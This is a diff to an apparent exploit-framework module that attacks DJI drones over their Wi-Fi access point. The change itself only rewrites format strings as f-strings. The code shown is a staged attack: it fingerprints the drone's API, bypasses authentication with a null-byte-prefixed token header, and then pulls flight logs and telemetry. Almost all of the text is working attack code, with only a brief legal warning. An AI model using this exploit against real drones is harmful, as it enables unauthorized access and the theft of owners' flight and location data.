@@ -129,9 +129,9 @@ class Exploit(HTTPClient):
     @mute
     def check(self) -> bool:
         scheme = "https" if self.ssl else "http"
-        base = "{}://{}:{}".format(scheme, self.target, self.port)
+        base = f"{scheme}://{self.target}:{self.port}"
         try:
-            res = self.http_request("GET", "{}{}".format(base, _API_VERSION), timeout=5)
+            res = self.http_request("GET", f"{base}{_API_VERSION}", timeout=5)
             if res and any(fp in (res.text or "") for fp in _DJI_FINGERPRINTS):
                 return True
         except Exception:
@@ -141,53 +141,53 @@ class Exploit(HTTPClient):
     def run(self) -> None:
         print_warning("[LEGAL] Only use against drones you own or have written authorization to test")
         scheme = "https" if self.ssl else "http"
-        base = "{}://{}:{}".format(scheme, self.target, self.port)
+        base = f"{scheme}://{self.target}:{self.port}"
 
         # Stage 1: fingerprint
-        print_status("[Stage 1] Fingerprinting DJI drone at {} (Wi-Fi AP mode)".format(self.target))
+        print_status(f"[Stage 1] Fingerprinting DJI drone at {self.target} (Wi-Fi AP mode)")
         try:
-            res = self.http_request("GET", "{}{}".format(base, _API_VERSION), timeout=5)
+            res = self.http_request("GET", f"{base}{_API_VERSION}", timeout=5)
             if res and res.text:
                 if any(fp in res.text for fp in _DJI_FINGERPRINTS):
                     print_success("[Stage 1] DJI drone confirmed")
-                    print_info("[Stage 1] Version info: {}".format(res.text[:256]))
+                    print_info(f"[Stage 1] Version info: {res.text[:256]}")
                 else:
                     print_warning("[Stage 1] DJI fingerprint not confirmed — proceeding")
             else:
                 print_warning("[Stage 1] No response — ensure you are connected to drone AP")
                 return
         except Exception as e:
-            print_error("[Stage 1] Connection failed: {}".format(e))
+            print_error(f"[Stage 1] Connection failed: {e}")
             return
 
         # Stage 2: auth bypass
         print_status("[Stage 2] Attempting auth bypass with null-byte token prefix")
         bypass_headers = {"X-DJI-Token": _BYPASS_TOKEN, "Content-Type": "application/json"}
         try:
-            res = self.http_request("GET", "{}{}".format(base, _API_CONFIG),
+            res = self.http_request("GET", f"{base}{_API_CONFIG}",
                                     headers=bypass_headers, timeout=8)
             if res and res.status_code == 200 and res.text:
                 print_success("[Stage 2] Auth bypass confirmed!")
-                print_info("[Stage 2] Config data: {}".format(res.text[:512]))
+                print_info(f"[Stage 2] Config data: {res.text[:512]}")
             elif res and res.status_code == 401:
                 print_warning("[Stage 2] 401 — bypass failed (firmware may be patched)")
             else:
                 print_warning("[Stage 2] HTTP {} — uncertain".format(
                     res.status_code if res else "no response"))
         except Exception as e:
-            print_warning("[Stage 2] Bypass check error: {}".format(e))
+            print_warning(f"[Stage 2] Bypass check error: {e}")
 
         # Stage 3: data extraction
         print_status("[Stage 3] Extracting flight logs and telemetry")
         for ep, desc in ((_API_FLIGHT_LOGS, "flight logs"), (_API_TELEMETRY, "telemetry")):
             try:
-                res = self.http_request("GET", "{}{}".format(base, ep),
+                res = self.http_request("GET", f"{base}{ep}",
                                         headers=bypass_headers, timeout=8)
                 if res and res.status_code == 200 and res.text:
-                    print_success("[Stage 3] {} ({} bytes)".format(desc, len(res.text)))
-                    print_info("[Stage 3] {}".format(res.text[:512]))
+                    print_success(f"[Stage 3] {desc} ({len(res.text)} bytes)")
+                    print_info(f"[Stage 3] {res.text[:512]}")
                 else:
                     print_info("[Stage 3] {} not accessible (HTTP {})".format(
                         desc, res.status_code if res else "no response"))
             except Exception as e:
-                print_warning("[Stage 3] {} error: {}".format(desc, e))
+                print_warning(f"[Stage 3] {desc} error: {e}")
